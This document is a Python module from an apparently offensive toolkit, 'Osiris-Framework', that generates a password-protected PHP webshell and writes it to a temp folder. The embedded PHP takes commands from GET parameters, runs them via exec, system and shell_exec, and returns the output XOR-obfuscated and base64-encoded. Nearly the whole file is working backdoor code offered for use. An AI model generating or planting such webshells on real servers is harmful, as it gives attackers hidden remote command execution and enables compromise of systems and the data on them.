#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337

from utilities.Colors import color
from utilities.Tools import tools

class WebshellGenerator:
    def __init__(self, **kwargs):
        self.__tmp_folder_created = None
        self.__payload = None
        self.__temp_message = None
        self.__status = {'message': '', 'code': 0}
        self.__path_temp_webshell = None
        self.__username = None
        self.__password = None
        self.__uri_webshell = None
        self.__tmp_folder = tools.temp_dir()['message'] + "/osiris-webshell/"

        for key, value in kwargs.items():
            self.__username = kwargs.get('username') if (kwargs.get('username') is not None) else False
            self.__password = kwargs.get('password') if (kwargs.get('password') is not None) else False
            self.__uri_webshell = kwargs.get('uri_webshell') if (kwargs.get('uri_webshell') is not None) else False

    def validate_parameters(self):
        self.__temp_message = ""
        if not self.__username:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow",
                                                                                        "{") + color.color(
                "green", "username") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")
        if not self.__password:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow",
                                                                                        "{") + color.color(
                "green", "password") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")

        if not self.__uri_webshell:
            self.__temp_message += color.color("lgray", "the parameter ") + color.color("yellow",
                                                                                        "{") + color.color(
                "green", "name_file") + color.color("yellow", "}") + color.color("lgray", " is a mandatory ")

        if len(self.__temp_message) > 0:
            self.__status['code'] = 500
            self.__status['message'] = self.__temp_message

        else:
            self.__status['code'] = 200

        return self.__status


    def PHP(self):
        """
            Description: This template is support for PHP
        """

        if self.validate_parameters()['code'] == 200:
            try:
                self.__payload = f"""
                    <?php
                    /*
                    # Project: Osiris-Framework
                    # Author: osiris-framework
                    # Version 1.337
                     */
                     
                     class OsirisWebShell
                    {{
                        private $username;
                        private $password;
                        private $command;
                        
                        public function __construct($username, $password, $command){{
                        $this->username = $username;
                        $this->password = $password;
                        $this->command = $command;
                    }}
                
                    public function isAuthenticated(){{
                
                        if($this->username === '{self.__username}' && $this->password === '{self.__password}' ){{
                            return true;
                        }}else{{
                            return false;
                        }}
                
                    }}
                
                    public function executeShell(){{
                
                        exec($this->command, $output);
                        if (!empty($output)) {{
                            return $output;
                        }}
                
                        $output = system($this->command);
                        if (!empty($output)) {{
                            return $output;
                        }}
                
                        $output = shell_exec($this->command);
                        if (!empty($output)) {{
                            return $output;
                        }}
                
                        return 'No se ha podido ejecutar el comando';
                    }}
                
                    public function iterateArray($array) {{
                        $output = "";
                        foreach ($array as $value) {{
                            $output.=$value . "\\n";
                        }}
                
                        return $output;
                    }}
                
                    public function encrypt($plaintext, $key) {{
                        $key_bytes = str_split($key, 1);
                
                        $ciphertext = '';
                        for ($i = 0; $i < strlen($plaintext); $i++) {{
                            $ciphertext .= chr(ord($plaintext[$i]) ^ ord($key_bytes[$i % count($key_bytes)]));
                        }}
                
                        return base64_encode($ciphertext);
                    }}
                
                }}
                
                function validateGetParams() {{
                    if (count($_GET) !== 3) {{
                        return false;
                    }}
                
                    if (!isset($_GET['user']) || !isset($_GET['pwd']) || !isset($_GET['load'])) {{
                        return false;
                    }}
                
                    return true;
                }}
                
                if (validateGetParams()) {{
                    $username = $_GET['user'];
                    $password = $_GET['pwd'];
                    $command = $_GET['load'];
                
                    $osiris = new OsirisWebShell($username, $password, $command);
                
                    if($osiris->isAuthenticated()){{
                        $result = $osiris->executeShell();
                        echo $osiris->encrypt($osiris->iterateArray($result), $password);
                
                    }}else{{
                        echo 'Las credenciales son invalidas';
                    }}
                }}else{{
                    echo 'Faltan parámetros en la solicitud';
                }}
                """

                self.__tmp_folder_created = tools.create_dir(self.__tmp_folder)
                self.__uri_webshell = self.__tmp_folder_created['message'] + self.__uri_webshell.split("/")[-1] #+ ".php"

                with open(self.__uri_webshell, "wb") as f:
                    f.write(self.__payload.encode())
                self.__status['code'] = 200
                self.__status['message'] = self.__uri_webshell
            except Exception as Error:
                self.__status['code'] = 500
                self.__status['message'] = self.__status['message'] if len(self.__status['message']) != 0 else color.color("red", "[-] ") + color.color("lgray", "The following error has occurred: ") + color.color("yellow",str(Error))

        return self.__status

